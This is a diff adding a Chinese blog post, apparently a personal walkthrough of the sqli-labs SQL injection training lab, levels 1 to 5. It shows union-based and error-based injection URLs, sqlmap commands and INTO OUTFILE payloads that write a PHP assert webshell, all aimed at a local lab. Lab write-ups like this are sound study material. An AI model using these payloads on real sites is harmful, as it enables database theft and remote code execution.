@@ -1,0 +1,540 @@
+<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;zh-CN&quot;,&quot;default&quot;]"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Npc"><meta name="copyright" content="Npc"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>sqlilab记录 | Npc | Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.css"><script src="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"npc0vo.github.io","root":"/","title":"Npc小站","version":"1.10.11","mode":"light","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://waline-onelastchicks-projects.vercel.app/","comment":false,"el":"#waline","lang":["en","zh-CN","default"]},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-1LL0D86CY9');
+}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="前置 参考其他dl的解法 【详细】 Sqli-labs1~65关 通关详解 解题思路+解题步骤+解析_sqlilabs靶场1–65过关-CSDN博客 sqli-labs通关大全（更新至Less60）_sqlilabs通关-CSDN博客 SQLI labs 靶场精简学习记录 | 国光 (sqlsec.com) 部署 docker pull acgpiano&#x2F;sqli-labs docker run">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlilab记录">
+<meta property="og:url" content="http://npc0vo.github.io/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Npc | Blog">
+<meta property="og:description" content="前置 参考其他dl的解法 【详细】 Sqli-labs1~65关 通关详解 解题思路+解题步骤+解析_sqlilabs靶场1–65过关-CSDN博客 sqli-labs通关大全（更新至Less60）_sqlilabs通关-CSDN博客 SQLI labs 靶场精简学习记录 | 国光 (sqlsec.com) 部署 docker pull acgpiano&#x2F;sqli-labs docker run">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://npc0vo.github.io/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240703230607768.png">
+<meta property="og:image" content="http://npc0vo.github.io/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240703230918517.png">
+<meta property="og:image" content="http://npc0vo.github.io/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240703231811881.png">
+<meta property="og:image" content="http://npc0vo.github.io/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240703233623862.png">
+<meta property="article:published_time" content="2024-07-08T14:40:22.000Z">
+<meta property="article:modified_time" content="2024-07-09T03:56:26.383Z">
+<meta property="article:author" content="Npc">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://npc0vo.github.io/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240703230607768.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Npc"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Npc"><span class="site-author-status">😭</span></a><div class="site-author-name"><a href="/about/">Npc</a></div><span class="site-name">Npc | Blog</span><sub class="site-subtitle">想s</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">45</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">9</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">12</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/npc0vo" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:me@1930278836@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text"> 前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#basic-challenges"><span class="toc-number">2.</span> <span class="toc-text"> Basic-Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#less-1"><span class="toc-number">2.1.</span> <span class="toc-text"> Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 联合注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap"><span class="toc-number">2.1.2.</span> <span class="toc-text"> sqlmap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-2"><span class="toc-number">2.2.</span> <span class="toc-text"> Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-3"><span class="toc-number">2.3.</span> <span class="toc-text"> Less-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-4"><span class="toc-number">2.4.</span> <span class="toc-text"> Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-5"><span class="toc-number">2.5.</span> <span class="toc-text"> Less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.1.</span> <span class="toc-text"> 报错注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-6"><span class="toc-number">2.6.</span> <span class="toc-text"> Less-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-7"><span class="toc-number">2.7.</span> <span class="toc-text"> Less-7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap-2"><span class="toc-number">2.7.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-number">2.7.2.</span> <span class="toc-text"> 写入webshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-8"><span class="toc-number">2.8.</span> <span class="toc-text"> Less-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-9"><span class="toc-number">2.9.</span> <span class="toc-text"> Less-9</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://npc0vo.github.io/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Npc"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Npc | Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">sqlilab记录</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-07-08 22:40:22" itemprop="dateCreated datePublished" datetime="2024-07-08T22:40:22+08:00">2024-07-08</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-07-09 11:56:26" itemprop="dateModified" datetime="2024-07-09T11:56:26+08:00">2024-07-09</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">14m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="前置"><a class="markdownIt-Anchor" href="#前置"></a> 前置</h2>
+<p>参考其他dl的解法</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/132081414">【详细】 Sqli-labs1~65关 通关详解 解题思路+解题步骤+解析_sqlilabs靶场1–65过关-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/elephantxiang/article/details/120091507">sqli-labs通关大全（更新至Less60）_sqlilabs通关-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html">SQLI labs 靶场精简学习记录 | 国光 (sqlsec.com)</a></p>
+<p>部署</p>
+<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker">docker pull acgpiano/sqli-labs
+docker run -dt --name sqli-lab -p 8888:80 acgpiano/sqli-labs:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>工具</p>
+<p>Firefox:hackbar+burpsuite</p>
+<p>目前是基础阶段，利用工具进行手注</p>
+<h2 id="basic-challenges"><a class="markdownIt-Anchor" href="#basic-challenges"></a> Basic-Challenges</h2>
+<h3 id="less-1"><a class="markdownIt-Anchor" href="#less-1"></a> Less-1</h3>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>id='$id'</code></td>
+</tr>
+</tbody>
+</table>
+<p>关键代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 单引号拼接</span>
+<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
+
+<span class="token comment"># 支持联合、报错、布尔盲注、延时盲注</span>
+<span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>
+    输出查询内容
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="联合注入"><a class="markdownIt-Anchor" href="#联合注入"></a> 联合注入</h4>
+<ol>
+<li>
+<p>判断类型</p>
+<img src="/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240703230607768.png" class="" alt="image-20240703230607768" loading="lazy">
+<p>故为字符型</p>
+</li>
+<li>
+<p>查字段个数</p>
+<img src="/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240703230918517.png" class="" alt="image-20240703230918517" loading="lazy">
+</li>
+</ol>
+<p>​	1,2,3均有回显，说明字段数有3个，盲猜<code>id</code>,<code>username</code>，<code>password</code></p>
+<ol start="3">
+<li>
+<p>查回显位</p>
+<p>字段数有三个，使用<code>union select 1，2,3</code></p>
+<p>注意这里的<code>id</code>要写一个不存在的值，否则会导致只显示前一个查询的查询结果</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;localhost:32769&#x2F;Less-1&#x2F;?id&#x3D;0&#39;union+select+1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240703231811881.png" class="" alt="image-20240703231811881" loading="lazy">
+<p>可见回显位为2,3</p>
+</li>
+<li>
+<p>爆数据库名</p>
+<p><code>http://localhost:32769/Less-1/?id=0'union+select+1,2,database()--+</code></p>
+<p>数据库名为<code>security</code></p>
+</li>
+<li>
+<p>爆表名</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:32769&#x2F;Less-1&#x2F;?id&#x3D;0&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+
+有emails，referers，uagents，users 4个表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</li>
+<li>
+<p>爆列名</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:32769&#x2F;Less-1&#x2F;?id&#x3D;0&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;emails&quot;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><code>email</code>的列名为 <code>id</code>,<code>email_id</code></p>
+<p><code>users</code>的列名为<code>id</code>,<code>username</code>，<code>password</code></p>
+</li>
+<li>
+<p>查信息</p>
+<p>现在就可以随便查了</p>
+<img src="/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240703233623862.png" class="" alt="image-20240703233623862" loading="lazy">
+</li>
+<li>
+<p>写入webshell</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http://localhost:32769/Less-1/?id=0'union select 1,2,'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span>less1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>' into outfile './less1.php'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><code>/var/lib/mysql/less1.php</code>这里是默认位置，为确保能连接网站shell要调整位置</p>
+</li>
+</ol>
+<h4 id="sqlmap"><a class="markdownIt-Anchor" href="#sqlmap"></a> sqlmap</h4>
+<p>如果<code>sqlmap</code>都跑不出来我觉得手注就可以放弃了，因为比较浪费时间</p>
+<p>但是一般网站<code>sqlmap</code>都跑不出来:(</p>
+<p><strong>联合查询注入</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">BASH
+sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbms&#x3D;MySQL --random-agent --flush-session --technique&#x3D;U -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>报错注入</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">BASH
+sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbms&#x3D;MySQL --random-agent --flush-session --technique&#x3D;E -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>布尔盲注</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">BASH
+sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbms&#x3D;MySQL --random-agent --flush-session --technique&#x3D;B -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>延时盲注</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">BASH
+sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbms&#x3D;MySQL --random-agent --flush-session --technique&#x3D;T -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="less-2"><a class="markdownIt-Anchor" href="#less-2"></a> Less-2</h3>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>id=$id</code></td>
+</tr>
+</tbody>
+</table>
+<p>这里与<code>Less-1</code>的区别在于，是数字型闭合，其实完全没区别</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://localhost:32769/Less-2/?id<span class="token operator">=</span><span class="token number">1</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">2</span>   <span class="token comment">#这里判断是数字型注入，不用闭合</span>
+http://localhost:32769/Less-2/?id<span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">3</span>
+http://localhost:32769/Less-2/?id<span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">4</span> <span class="token comment">#这里判断出有3个字段</span>
+http://localhost:32769/Less-2/?id<span class="token operator">=</span><span class="token number">0</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,3<span class="token comment">#回显为2,3</span>
+http://localhost:32769/Less-2/?id<span class="token operator">=</span><span class="token number">0</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#爆数据库名</span>
+http://localhost:32769/Less-2/?id<span class="token operator">=</span><span class="token number">0</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#爆出了表名</span>
+http://localhost:32769/Less-2/?id<span class="token operator">=</span><span class="token number">0</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">"users"</span>#爆出了列名
+http://localhost:32769/Less-2/?id<span class="token operator">=</span><span class="token number">0</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">"users"</span>#爆信息
+http://192.168.101.16/sqli-labs-master/Less-2/?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token string">'&lt;?php assert($_POST[less2]);?>'</span> into outfile <span class="token string">'C:/less2.php'</span>-- s<span class="token comment">#写webshell</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="less-3"><a class="markdownIt-Anchor" href="#less-3"></a> Less-3</h3>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>id=('$id')</code></td>
+</tr>
+</tbody>
+</table>
+<p>与<code>Less-1</code>差不多,不过这里的闭合需要将括号也给闭合掉</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://localhost:32769/Less-3/?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'#从这里的报错可以得知需要闭合什么符号
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '</span>'1<span class="token string">''</span><span class="token punctuation">)</span> LIMIT <span class="token number">0,1</span><span class="token string">' at line 1  --->这里就显示出了闭合方式是('</span><span class="token variable">$id</span><span class="token string">')
+
+http://localhost:32769/Less-3/?id=1'</span><span class="token punctuation">)</span> order by <span class="token number">4</span>--+
+http://localhost:32769/Less-3/?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">') order by 3--+ #当前表的列数
+
+http://localhost:32769/Less-3/?id=-1'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,3--+<span class="token comment">#判断出当前的回显位为2,3</span>
+http://localhost:32769/Less-3/?id<span class="token operator">=</span>-1<span class="token string">')union select 1,2,database()--+#判断出数据库名
+1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+#爆出当前数据库的表名
+http://localhost:32769/Less-3/?id=-1'</span><span class="token punctuation">)</span>union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">"users"</span>--+<span class="token comment">#爆出列名</span>
+
+http://localhost:32769/Less-3/?id<span class="token operator">=</span>-1'<span class="token punctuation">)</span>union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> from <span class="token function">users</span> --+<span class="token comment">#爆出信息</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="less-4"><a class="markdownIt-Anchor" href="#less-4"></a> Less-4</h3>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>id=(&quot;$id&quot;)</code></td>
+</tr>
+</tbody>
+</table>
+<p>与<code>Less-3</code>是一样的，就闭合方式不同</p>
+<h3 id="less-5"><a class="markdownIt-Anchor" href="#less-5"></a> Less-5</h3>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>id='$id'</code></td>
+</tr>
+</tbody>
+</table>
+<p>这一关由于不回显查询结果，所以联合注入是用不了的</p>
+<h4 id="报错注入"><a class="markdownIt-Anchor" href="#报错注入"></a> 报错注入</h4>
+<ul>
+<li>基于<code>XPath</code>的报错注入</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://localhost:32769/Less-5/?id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">\</span>#判断出闭合方式 是单引号闭合
+http://localhost:32769/Less-5/?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+#爆库名
+http://localhost:32769/Less-5/?id=1'</span>and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name <span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span class="token comment">#爆出当前的表名</span>
+http://localhost:32769/Less-5/?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database()and table_name="users"),0x7e),1)--+#爆出当前表的列名
+http://localhost:32769/Less-5/?id=1'</span>and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span>from <span class="token function">users</span> <span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span class="token comment">#在这里会发现报错注入的回显长度不够  我们用substr或者mid就可以解决</span>
